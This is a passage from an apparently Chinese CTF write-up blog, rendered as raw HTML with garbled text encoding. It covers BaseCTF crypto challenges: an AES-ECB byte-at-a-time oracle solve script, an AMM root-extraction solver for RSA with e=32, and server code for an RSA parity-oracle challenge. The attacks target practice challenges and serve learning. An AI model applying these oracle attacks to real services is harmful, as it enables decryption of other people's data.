style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">{</span><span class="mord">0</span><span class="mord">1</span><span class="mord">2</span><span class="mord">3</span><span class="mord">4</span><span class="mord">5</span><span class="mord">6</span><span class="mord">7</span><span class="mord">8</span><span class="mord">9</span><span class="mclose">}</span></span></span></span></p><p>å½“æˆ‘ä»¬çˆ†ç ´åˆ°è¿™ä¸ªå­—èŠ‚ä¸ºBæ—¶ï¼ŒæœåŠ¡å™¨åŠ å¯†çš„ç¬¬äºŒä¸ªåˆ†ç»„è·Ÿæˆ‘ä»¬ç¬¬ä¸€æ¬¡å‘é€çš„ç¬¬äºŒä¸ªåˆ†ç»„ç›¸åŒï¼Œäº§ç”Ÿçš„å¯†æ–‡ä¹Ÿå°±ç›¸åŒï¼Œé‚£ä¹ˆå°±å¯ä»¥æ¨æ–­å‡ºçˆ†ç ´æˆåŠŸï¼Œä¹‹åå‘é€æ•°æ®å°±è¦è¿å¸¦ä¸Šçˆ†ç ´å‡ºæ¥çš„flagã€‚</p><p>è¿™é‡Œåœ¨ä¸¾çˆ†ç ´ä¸€ä¸ªåˆ†ç»„é•¿åº¦åçš„ä¾‹å­ï¼š</p><p>æ­¤æ—¶æˆ‘ä»¬éœ€è¦çˆ†ç ´flagçš„ç¬¬17å­—èŠ‚ï¼Œæˆ‘ä»¬å·²çŸ¥flagçš„å‰16å­—èŠ‚ï¼Œæˆ‘ä»¬å‘é€(31-16)=15å­—èŠ‚çš„aï¼Œå¾—åˆ°ï¼š</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>B</mi><mi mathvariant="normal">âˆ£</mi><mi>a</mi><mi>s</mi><mi>e</mi><mi>C</mi><mi>T</mi><mi>F</mi><mo stretchy="false">{</mo><mn>012345678</mn><mi mathvariant="normal">âˆ£</mi><mn>9</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">aaaaaaaaaaaaaaaB|aseCTF\{012345678|9\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord">âˆ£</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">{</span><span class="mord">0</span><span class="mord">1</span><span class="mord">2</span><span class="mord">3</span><span class="mord">4</span><span class="mord">5</span><span class="mord">6</span><span class="mord">7</span><span class="mord">8</span><span class="mord">âˆ£</span><span class="mord">9</span><span class="mclose">}</span></span></span></span></p><p>ä¹‹åçˆ†ç ´ç¬¬17ä½ï¼Œæ­¤æ—¶å‘é€æ•°æ®éœ€è¦å¸¦ä¸Šflagï¼Œè¿™æ˜¯æˆ‘ä»¬å‘é€çš„æ•°æ®aaaaaaaaaaaaaaaB|aseCTF{01234567?ï¼Œæœ€åå¾—åˆ°ï¼š</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>B</mi><mi mathvariant="normal">âˆ£</mi><mi>a</mi><mi>s</mi><mi>e</mi><mi>C</mi><mi>T</mi><mi>F</mi><mo stretchy="false">{</mo><mn>01234567</mn><mo stretchy="false">?</mo><mi mathvariant="normal">âˆ£</mi><mi>B</mi><mi>a</mi><mi>s</mi><mi>e</mi><mi>C</mi><mi>T</mi><mi>F</mi><mo stretchy="false">{</mo><mn>0123456789</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">aaaaaaaaaaaaaaaaB|aseCTF\{01234567?|BaseCTF\{0123456789\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord">âˆ£</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">{</span><span class="mord">0</span><span class="mord">1</span><span class="mord">2</span><span class="mord">3</span><span class="mord">4</span><span class="mord">5</span><span class="mord">6</span><span class="mord">7</span><span class="mclose">?</span><span class="mord">âˆ£</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">{</span><span class="mord">0</span><span class="mord">1</span><span class="mord">2</span><span class="mord">3</span><span class="mord">4</span><span class="mord">5</span><span class="mord">6</span><span class="mord">7</span><span class="mord">8</span><span class="mord">9</span><span class="mclose">}</span></span></span></span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br>p=remote()<br><br><span class="hljs-built_in">print</span>(p.recvline())<br><span class="hljs-built_in">print</span>(p.recvline())<br><br>c=p.recvline()[:-<span class="hljs-number">1</span>]<br>c=base64.b64decode(c)<br><br>length1=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    p.recvline()    <span class="hljs-comment"># b&quot;:\n&quot;</span><br>    payload=<span class="hljs-string">b&#x27;a&#x27;</span>*i<br>    p.sendline(payload)<br>    d=p.recvline()[:-<span class="hljs-number">1</span>]<br>    d=base64.b64decode(d)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(d)!=<span class="hljs-built_in">len</span>(c):<br>        length1=i<br>        <span class="hljs-keyword">break</span><br>length_flag=<span class="hljs-built_in">len</span>(c)-length1<br><span class="hljs-built_in">print</span>(length_flag)<br><br><span class="hljs-comment"># ä»å‰å¾€åçˆ†ç ´flag</span><br>payload_length=<span class="hljs-built_in">len</span>(c)+<span class="hljs-number">16</span>     <span class="hljs-comment"># å¤šä¸€ä¸ªåˆ†ç»„ä¿å®¹é”™</span><br>flag=<span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(payload_length-<span class="hljs-number">1</span>,payload_length-<span class="hljs-number">1</span>-length_flag,-<span class="hljs-number">1</span>):<br>    p.recvline()    <span class="hljs-comment"># b&quot;:\n&quot;</span><br>    payload=<span class="hljs-string">b&#x27;a&#x27;</span>*i<br>    p.sendline(payload)<br>    d=p.recvline()[:-<span class="hljs-number">1</span>]<br>    d=base64.b64decode(d)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">128</span>):<br>        p.recvline()    <span class="hljs-comment"># b&quot;:\n&quot;</span><br>        payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*i+flag+<span class="hljs-built_in">chr</span>(j).encode()<br>        p.sendline(payload1)<br>        e=p.recvline()[:-<span class="hljs-number">1</span>]<br>        e=base64.b64decode(e)<br>        e=e[payload_length-<span class="hljs-number">16</span>:payload_length]<br>        <span class="hljs-keyword">if</span> e <span class="hljs-keyword">in</span> d:<br>            flag+=<span class="hljs-built_in">chr</span>(j).encode()<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-string">&quot;&quot;&quot;# ä»åå¾€å‰çˆ†ç ´flag(æ­¤æ–¹æ³•éœ€è¦çŸ¥é“å¡«å……æ¨¡å¼)</span><br><span class="hljs-string">from Crypto.Util.Padding import pad</span><br><span class="hljs-string">from Crypto.Cipher import AES</span><br><span class="hljs-string"></span><br><span class="hljs-string"># åœ¨å‰é¢å¡«å……åˆ°æ»¡è¶³AESåŠ å¯†çš„åˆ†ç»„é•¿åº¦</span><br><span class="hljs-string">dic=&#x27;&#123;&#125;-BCTF0123456789abcdef&#x27;</span><br><span class="hljs-string">flag=b&#x27;&#x27;</span><br><span class="hljs-string">for i in range(length_flag):</span><br><span class="hljs-string">    p.recvline()    # b&quot;:\n&quot;</span><br><span class="hljs-string">    server_payload=b&#x27;a&#x27;*(length1+i+1)</span><br><span class="hljs-string">    p.sendline(server_payload)</span><br><span class="hljs-string">    server_flag=p.recvline()[:-1]</span><br><span class="hljs-string">    server_flag=base64.b64decode(server_flag)</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    for j in dic:</span><br><span class="hljs-string">        p.recvline()    # b&quot;:\n&quot;</span><br><span class="hljs-string">        my_payload=j.encode()+flag</span><br><span class="hljs-string">        my_payload=pad(my_payload,AES.block_size)</span><br><span class="hljs-string">        my_payload=my_payload+b&#x27;a&#x27;  # æˆ‘ä¹Ÿä¸çŸ¥é“è¿™é‡Œä¸ºä»€ä¹ˆè¦å¤šåŠ ä¸€ä¸ªå­—èŠ‚,å½“i=2æ—¶ä¸åŠ è¿™ä¸ªå­—èŠ‚å°±ä¼šå‡ºé”™</span><br><span class="hljs-string">        p.sendline(my_payload)</span><br><span class="hljs-string">        my_flag=p.recvline()[:-1]</span><br><span class="hljs-string">        my_flag=base64.b64decode(my_flag)</span><br><span class="hljs-string">        my_flag=my_flag[:16]</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        if my_flag in server_flag:</span><br><span class="hljs-string">            flag=j.encode()+flag</span><br><span class="hljs-string">            </span><br><span class="hljs-string">            break</span><br><span class="hljs-string">    print(flag)&quot;&quot;&quot;</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ã®æ­ªæ¥"><a class="markdownIt-Anchor" href="#ã®æ­ªæ¥"></a> ã®æ­ªæ¥</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>flag=<span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(flag)==<span class="hljs-number">28</span><br>m=bytes_to_long(flag)<br><br>n=getPrime(<span class="hljs-number">2048</span>)<br>e=<span class="hljs-number">32</span><br><br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n =&quot;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e =&quot;</span>,e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>,c)<br><br></code></pre></td></tr></table></figure><p>AMMå¼€æ ¹</p><p>è®ºæ–‡åœ¨è¿™é‡Œï¼š<a href="https://arxiv.org/pdf/1111.4877">1111.4877 (arxiv.org)</a></p><blockquote><p>æˆ‘è¿˜æ²¡ææ‡‚ï¼Œæ‰€ä»¥ç›´æ¥å¥—ç”¨äº†æ¿å­ã€‚</p><p>æˆ‘å‡ºè¿™é¢˜åªæ˜¯æƒ³ç€AMMçš„å¸¸è§„æ¿å­æ˜¯ä¸¤ä¸ªç´ æ•°æ±‚è§£ç„¶åæ±‚CRTï¼Œæˆ‘å°±æ”¹æˆäº†ä¸€ä¸ªç´ æ•°ï¼Œç„¶åå°må¯ä»¥ç›´æ¥å¾—åˆ°ã€‚</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> math<br><br><br>p = <span class="hljs-number">17363249226879909675667629533972233798566313669420563155296918020175446973456428454735263489044575257132690882883587342817653451483222705760704890265900885255972067349104579938808591608382992680533327518070878297438339884996059309549300942570104747348751766711833983705979880714174709047335147739991850385244159235504375559144283494800573079055547597410783559965162216203307100248001158445665271438067670522510991047688414176659907164436539491205637933681658814267567385232097679554282863595183422504494357205180093828786415060565003183966959273253039416986816444073158723191290806413175478175738266995214965220231649</span><br>e = <span class="hljs-number">32</span><br>c = <span class="hljs-number">6840453756562205147103219479843999687625029691496635689045074720240615321966887831642035124198445485320265097191334720798522097422084141332044111764558336174743819347952914775206809737198058220362381349481027893609144697054465070779290329222696236671374412706789862193871687821041053566873553189148668599841084370137084893575567622972476409755187388121177923217208552049876944055745912987536390075417261016809335539362984984190264791744790640858201038207982043569204062714722892105134794280417020318408200038144689432974312283915592134911446185412636709207566063730723406969727969141426530341540330398465744403597273</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">onemod</span>(<span class="hljs-params">e, q</span>):<br>    p = random.randint(<span class="hljs-number">1</span>, q-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span>(powmod(p, (q-<span class="hljs-number">1</span>)//e, q) == <span class="hljs-number">1</span>):  <span class="hljs-comment"># (r,s)=1</span><br>        p = random.randint(<span class="hljs-number">1</span>, q)<br>    <span class="hljs-keyword">return</span> p<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">AMM_rth</span>(<span class="hljs-params">o, r, q</span>):  <span class="hljs-comment"># r|(q-1</span><br>    <span class="hljs-keyword">assert</span>((q-<span class="hljs-number">1</span>) % r == <span class="hljs-number">0</span>)<br>    p = onemod(r, q)<br><br>    t = <span class="hljs-number">0</span><br>    s = q-<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>(s % r == <span class="hljs-number">0</span>):<br>        s = s//r<br>        t += <span class="hljs-number">1</span><br>    k = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>((s*k+<span class="hljs-number">1</span>) % r != <span class="hljs-number">0</span>):<br>        k += <span class="hljs-number">1</span><br>    alp = (s*k+<span class="hljs-number">1</span>)//r<br><br>    a = powmod(p, r**(t-<span class="hljs-number">1</span>)*s, q)<br>    b = powmod(o, r*a-<span class="hljs-number">1</span>, q)<br>    c = powmod(p, s, q)<br>    h = <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, t-<span class="hljs-number">1</span>):<br>        d = powmod(<span class="hljs-built_in">int</span>(b), r**(t-<span class="hljs-number">1</span>-i), q)<br>        <span class="hljs-keyword">if</span> d == <span class="hljs-number">1</span>:<br>            j = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">else</span>:<br>            j = (-math.log(d, a)) % r<br>        b = (b*(c**(r*j))) % q<br>        h = (h*c**j) % q<br>        c = (c*r) % q<br>    result = (powmod(o, alp, q)*h)<br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ALL_Solution</span>(<span class="hljs-params">m, q, rt, cq, e</span>):<br>    mp = []<br>    <span class="hljs-keyword">for</span> pr <span class="hljs-keyword">in</span> rt:<br>        r = (pr*m) % q<br>        <span class="hljs-comment"># assert(pow(r, e, q) == cq)</span><br>        mp.append(r)<br>    <span class="hljs-keyword">return</span> mp<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ALL_ROOT2</span>(<span class="hljs-params">r, q</span>):  <span class="hljs-comment"># use function set() and .add() ensure that the generated elements are not repeated</span><br>    li = <span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">len</span>(li) &lt; r):<br>        p = powmod(random.randint(<span class="hljs-number">1</span>, q-<span class="hljs-number">1</span>), (q-<span class="hljs-number">1</span>)//r, q)<br>        li.add(p)<br>    <span class="hljs-keyword">return</span> li<br><br>cp = c % p<br><br>mp = AMM_rth(cp, e, p)<br><br>rt1 = ALL_ROOT2(e, p) <br>amp = ALL_Solution(mp, p, rt1, cp, e)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> amp:<br>    m=long_to_bytes(i)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;BaseCTF&#x27;</span> <span class="hljs-keyword">in</span> m:<br>        <span class="hljs-built_in">print</span>(m)<br>        <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><h3 id="è€æ¶©æ‰¹äº†"><a class="markdownIt-Anchor" href="#è€æ¶©æ‰¹äº†"></a> è€æ¶©æ‰¹äº†</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> uuid <br>flag = os.getenv(<span class="hljs-string">&#x27;GZCTF_FLAG&#x27;</span>).encode()<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>(socketserver.BaseRequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_recvall</span>(<span class="hljs-params">self</span>):<br>        BUFF_SIZE = <span class="hljs-number">2048</span><br>        data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            part = <span class="hljs-variable language_">self</span>.request.recv(BUFF_SIZE)<br>            data += part<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(part) &lt; BUFF_SIZE:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">return</span> data.strip()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, msg, newline=<span class="hljs-literal">True</span></span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> newline:<br>                msg += <span class="hljs-string">b&#x27;\n&#x27;</span><br>            <span class="hljs-variable language_">self</span>.request.sendall(msg)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">recv</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>._recvall()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):<br>        <br>        p=getPrime(<span class="hljs-number">256</span>)<br>        q=getPrime(<span class="hljs-number">256</span>)<br>        n=p*q<br>        e=<span class="hljs-number">65537</span><br>        d=inverse(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><br>        text=<span class="hljs-string">b&#x27;BaseCTF&#123;&#x27;</span>+<span class="hljs-built_in">str</span>(uuid.uuid4()).encode()+<span class="hljs-string">b&#x27;&#125;&#x27;</span><br><br>        m1=bytes_to_long(text[:<span class="hljs-built_in">len</span>(text)//<span class="hljs-number">2</span>])<br>        c1=<span class="hljs-built_in">pow</span>(m1,e,n)<br><br>        m2=bytes_to_long(text[<span class="hljs-built_in">len</span>(text)//<span class="hljs-number">2</span>:])<br>        c2=<span class="hljs-built_in">pow</span>(m2,e,n)<br><br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;n = &#x27;</span>+<span class="hljs-built_in">str</span>(n).encode())<br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;e = &#x27;</span>+<span class="hljs-built_in">str</span>(e).encode())<br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;c1 = &#x27;</span>+<span class="hljs-built_in">str</span>(c1).encode())<br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;c2 = &#x27;</span>+<span class="hljs-built_in">str</span>(c2).encode())<br><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            select=<span class="hljs-variable language_">self</span>.recv().strip()<br>            <span class="hljs-keyword">if</span> select==<span class="hljs-string">b&#x27;1&#x27;</span>:<br>                c=<span class="hljs-built_in">int</span>(<span class="hljs-variable language_">self</span>.recv().decode().strip())<br>                m=<span class="hljs-built_in">pow</span>(c,d,n)<br>                res=m&amp;<span class="hljs-number">1</span><br>            <span class="hljs-keyword">elif</span> select==<span class="hljs-string">b&#x27;2&#x27;</span>:<br>                c=<span class="hljs-built_in">int</span>(<span class="hljs-variable language_">self</span>.recv().decode().strip())<br>                m=<span class="hljs-built_in">pow</span>(c,d,n)<br>                res=long_to_bytes(m,<span class="hljs-number">64</span>)[<span class="hljs-number">0</span>]<br>            <span class="hljs-keyword">elif</span> select==<span class="hljs-string">b&#x27;3&#x27;</span>:<br>                user_text=<span class="hljs-variable language_">self</span>.recv().strip()<br>                <span class="hljs-keyword">if</span> user_text==text:<br>                    <span class="hljs-variable language_">self</span>.send(flag)<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;try again&#x27;</span>)<br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span> :<br>                <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;wrong&#x27;</span>)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-built_in">str</span>(res).encode())<br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nConnection has been closed  =.=  &quot;</span>)<br>        <span class="hljs-variable language_">self</span>.request.close()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadedServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ForkedServer</span>(socketserver.ForkingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    HOST, PORT = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">9999</span><br>    server = ForkedServer((HOST, PORT), Task)<br>    server.allow_reuse_address = <span class="hljs-literal">True</span><br>    server.serve_forever()<br><br></code></pre></td></tr></table></figure><p>å‚è€ƒäº†Laä½¬çš„åšå®¢ï¼š<a href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/">RSA | 